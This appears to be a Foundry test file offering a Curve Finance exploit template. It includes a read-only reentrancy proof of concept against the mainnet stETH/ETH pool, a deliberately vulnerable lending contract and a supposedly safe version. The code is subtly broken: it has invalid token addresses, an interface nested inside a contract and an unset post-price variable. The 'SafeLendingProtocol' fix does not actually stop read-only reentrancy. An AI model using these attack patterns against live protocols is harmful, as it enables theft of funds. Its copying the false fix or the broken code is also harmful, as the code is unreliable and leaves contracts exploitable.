// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title Curve Finance Exploit PoC Template
 * @notice Template for exploits involving Curve integrations
 *
 * Common attack vectors:
 * 1. Read-only reentrancy via get_virtual_price()
 * 2. Vyper reentrancy bug (0.2.15 - 0.3.0)
 * 3. Imbalanced pool exploitation
 * 4. A parameter manipulation
 */

// Curve Interfaces
interface ICurvePool {
    function get_virtual_price() external view returns (uint256);
    function add_liquidity(uint256[2] calldata amounts, uint256 min_mint_amount) external payable returns (uint256);
    function remove_liquidity(uint256 _amount, uint256[2] calldata min_amounts) external returns (uint256[2] memory);
    function remove_liquidity_one_coin(uint256 _token_amount, int128 i, uint256 _min_amount) external returns (uint256);
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external payable returns (uint256);
    function get_dy(int128 i, int128 j, uint256 dx) external view returns (uint256);
    function balances(uint256 i) external view returns (uint256);
    function A() external view returns (uint256);
    function coins(uint256 i) external view returns (address);
}

interface ICurvePoolETH {
    function add_liquidity(uint256[2] calldata amounts, uint256 min_mint_amount) external payable returns (uint256);
    function remove_liquidity(uint256 _amount, uint256[2] calldata min_amounts) external returns (uint256[2] memory);
    function remove_liquidity_one_coin(uint256 _token_amount, int128 i, uint256 _min_amount) external returns (uint256);
}

interface ICurveLPToken {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/**
 * @title CurveExploitPoC
 * @notice Base template for Curve exploits
 */
abstract contract CurveExploitPoC is Test {
    // Mainnet pools
    address constant STETH_ETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
    address constant TRICRYPTO2_POOL = 0xD51a44d3FaE010294C616388b506AcDA1bfAAE46;
    address constant FRAX_USDC_POOL = 0xDcEF968d416a41Cdac0ED8702fAC8128A64241A2;
    address constant THREE_POOL = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;

    // Common tokens
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaijAb4dc8cd83CE9;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant DAI = 0x6B175474E89094C44Da98b954EedDcDAD11091;
    address constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;

    address constant ATTACKER = address(0xBAD);

    function setUp() public virtual {
        // Fork mainnet
        vm.createSelectFork("mainnet", 18_500_000);
    }

    /// @notice Get virtual price (DANGEROUS during callbacks!)
    function _getVirtualPrice(address pool) internal view returns (uint256) {
        return ICurvePool(pool).get_virtual_price();
    }

    /// @notice Log pool state
    function _logPoolState(address pool) internal view {
        console.log("=== Pool State ===");
        console.log("Virtual Price:", ICurvePool(pool).get_virtual_price());
        console.log("Balance[0]:", ICurvePool(pool).balances(0));
        console.log("Balance[1]:", ICurvePool(pool).balances(1));
        console.log("A parameter:", ICurvePool(pool).A());
    }
}

/**
 * @title CurveReadOnlyReentrancy
 * @notice CRITICAL: Read-only reentrancy via get_virtual_price()
 *
 * This is the most common Curve vulnerability pattern.
 * When ETH is sent during remove_liquidity, the virtual price
 * calculation is STALE because balances are updated AFTER the ETH transfer.
 *
 * Historical exploits:
 * - Sentiment Protocol: $1M loss (Apr 2023)
 * - Multiple lending protocols using Curve LP as collateral
 */
contract CurveReadOnlyReentrancy is CurveExploitPoC {
    // State for tracking attack
    uint256 public virtualPriceDuringCallback;
    uint256 public virtualPriceAfterCallback;
    bool public inAttack;

    // Vulnerable protocol interface (simulated)
    interface IVulnerableProtocol {
        function deposit(uint256 amount) external;
        function borrow(uint256 amount) external;
        function getCollateralValue(address user) external view returns (uint256);
    }

    function test_readOnlyReentrancy() public {
        vm.startPrank(ATTACKER);
        vm.deal(ATTACKER, 1000 ether);

        console.log("=== Curve Read-Only Reentrancy ===");
        console.log("Target: stETH/ETH Pool");

        // Step 1: Get LP tokens
        console.log("\n--- Step 1: Add Liquidity ---");
        uint256[2] memory amounts = [uint256(500 ether), uint256(500 ether)];

        // Approve stETH
        deal(STETH, ATTACKER, 500 ether);
        IERC20(STETH).approve(STETH_ETH_POOL, 500 ether);

        // Add liquidity with ETH
        uint256 lpReceived = ICurvePoolETH(STETH_ETH_POOL).add_liquidity{value: 500 ether}(amounts, 0);
        console.log("LP tokens received:", lpReceived / 1e18);

        // Step 2: Check virtual price before
        console.log("\n--- Step 2: Virtual Price Before Attack ---");
        uint256 vpBefore = _getVirtualPrice(STETH_ETH_POOL);
        console.log("Virtual price:", vpBefore);

        // Step 3: Remove liquidity to trigger callback
        console.log("\n--- Step 3: Remove Liquidity (triggers callback) ---");
        inAttack = true;

        // This will send ETH to us, triggering receive()
        uint256[2] memory minAmounts = [uint256(0), uint256(0)];
        ICurvePoolETH(STETH_ETH_POOL).remove_liquidity(lpReceived / 2, minAmounts);

        inAttack = false;

        // Step 4: Compare prices
        console.log("\n--- Step 4: Price Comparison ---");
        console.log("Virtual price DURING callback:", virtualPriceDuringCallback);
        console.log("Virtual price AFTER callback:", virtualPriceAfterCallback);
        console.log("Difference:", virtualPriceAfterCallback - virtualPriceDuringCallback);

        console.log("\n!!! The price during callback was STALE !!!");
        console.log("An attacker could exploit this to:");
        console.log("1. Deposit LP at inflated value during callback");
        console.log("2. Borrow more than they should");
        console.log("3. Profit from the difference");

        vm.stopPrank();
    }

    /// @notice This is called when pool sends ETH during remove_liquidity
    receive() external payable {
        if (inAttack) {
            // Read virtual price during the callback
            // This is STALE because pool balances haven't been updated yet
            virtualPriceDuringCallback = _getVirtualPrice(STETH_ETH_POOL);
            console.log("  [CALLBACK] Virtual price read:", virtualPriceDuringCallback);

            // In a real attack, would now:
            // 1. Use stale price to deposit LP at inflated value
            // 2. Borrow against inflated collateral
            // 3. Profit when price normalizes
        }
    }

    /// @notice Called after remove_liquidity completes
    function capturePostPrice() external {
        virtualPriceAfterCallback = _getVirtualPrice(STETH_ETH_POOL);
    }
}

/**
 * @title VyperReentrancyBugDemo
 * @notice Demonstrates the Vyper @nonreentrant bug (0.2.15 - 0.3.0)
 *
 * In vulnerable Vyper versions, @nonreentrant doesn't work properly.
 * Pools compiled with these versions can be reentered.
 */
contract VyperReentrancyBugDemo is CurveExploitPoC {
    function test_vyperReentrancyBug() public view {
        console.log("=== Vyper Reentrancy Bug Analysis ===");
        console.log("");
        console.log("Affected Vyper versions: 0.2.15, 0.2.16, 0.3.0");
        console.log("Fixed in: Vyper 0.3.1+");
        console.log("");
        console.log("The @nonreentrant decorator was broken in these versions.");
        console.log("Any Curve pool compiled with vulnerable Vyper is at risk.");
        console.log("");
        console.log("Historical exploit: July 30, 2023");
        console.log("- alETH/ETH pool drained");
        console.log("- pETH/ETH pool drained");
        console.log("- msETH/ETH pool drained");
        console.log("Total losses: ~$70M");
        console.log("");
        console.log("To check if a pool is vulnerable:");
        console.log("1. Get the bytecode");
        console.log("2. Decompile to check Vyper version");
        console.log("3. Or check deployment tx for compiler version");
    }
}

/**
 * @title ImbalancedPoolExploit
 * @notice Exploit heavily imbalanced pools
 */
contract ImbalancedPoolExploit is CurveExploitPoC {
    function test_imbalancedPool() public {
        vm.startPrank(ATTACKER);

        console.log("=== Imbalanced Pool Analysis ===");

        // Get pool balances
        uint256 balance0 = ICurvePool(STETH_ETH_POOL).balances(0);
        uint256 balance1 = ICurvePool(STETH_ETH_POOL).balances(1);

        console.log("Pool balances:");
        console.log("ETH:", balance0 / 1e18);
        console.log("stETH:", balance1 / 1e18);

        // Calculate imbalance ratio
        uint256 ratio = balance0 * 100 / balance1;
        console.log("Balance ratio (ETH/stETH %):", ratio);

        // In imbalanced pools:
        // 1. Swaps in one direction get worse rates
        // 2. Adding single-sided liquidity can be exploited
        // 3. Virtual price can be manipulated more easily

        if (ratio < 95 || ratio > 105) {
            console.log("Pool is imbalanced! Potential attack vectors:");
            console.log("- Arbitrage opportunity");
            console.log("- Single-sided liquidity add/remove");
            console.log("- Virtual price manipulation");
        } else {
            console.log("Pool is balanced");
        }

        vm.stopPrank();
    }
}

/**
 * @title VulnerableLendingProtocol
 * @notice Example of a protocol vulnerable to Curve read-only reentrancy
 */
contract VulnerableLendingProtocol {
    ICurvePool public curvePool;
    mapping(address => uint256) public deposits;
    mapping(address => uint256) public borrows;

    constructor(address _curvePool) {
        curvePool = ICurvePool(_curvePool);
    }

    /// @notice VULNERABLE: Uses get_virtual_price() which can be stale during callback
    function getCollateralValue(address user) public view returns (uint256) {
        uint256 lpBalance = deposits[user];
        uint256 virtualPrice = curvePool.get_virtual_price(); // VULNERABLE!
        return lpBalance * virtualPrice / 1e18;
    }

    function deposit(uint256 amount) external {
        deposits[msg.sender] += amount;
    }

    function borrow(uint256 amount) external {
        uint256 collateralValue = getCollateralValue(msg.sender);
        uint256 maxBorrow = collateralValue * 80 / 100; // 80% LTV
        require(borrows[msg.sender] + amount <= maxBorrow, "Exceeds borrow limit");
        borrows[msg.sender] += amount;
    }
}

/**
 * @title SafeLendingProtocol
 * @notice Example of properly protected protocol
 */
contract SafeLendingProtocol {
    ICurvePool public curvePool;
    mapping(address => uint256) public deposits;
    mapping(address => uint256) public borrows;

    // Use reentrancy guard
    uint256 private constant NOT_ENTERED = 1;
    uint256 private constant ENTERED = 2;
    uint256 private _status = NOT_ENTERED;

    constructor(address _curvePool) {
        curvePool = ICurvePool(_curvePool);
    }

    modifier nonReentrant() {
        require(_status != ENTERED, "ReentrancyGuard: reentrant call");
        _status = ENTERED;
        _;
        _status = NOT_ENTERED;
    }

    /// @notice SAFE: Protected by reentrancy guard
    function getCollateralValue(address user) public view returns (uint256) {
        uint256 lpBalance = deposits[user];
        uint256 virtualPrice = curvePool.get_virtual_price();
        return lpBalance * virtualPrice / 1e18;
    }

    function deposit(uint256 amount) external nonReentrant {
        deposits[msg.sender] += amount;
    }

    function borrow(uint256 amount) external nonReentrant {
        uint256 collateralValue = getCollateralValue(msg.sender);
        uint256 maxBorrow = collateralValue * 80 / 100;
        require(borrows[msg.sender] + amount <= maxBorrow, "Exceeds borrow limit");
        borrows[msg.sender] += amount;
    }
}
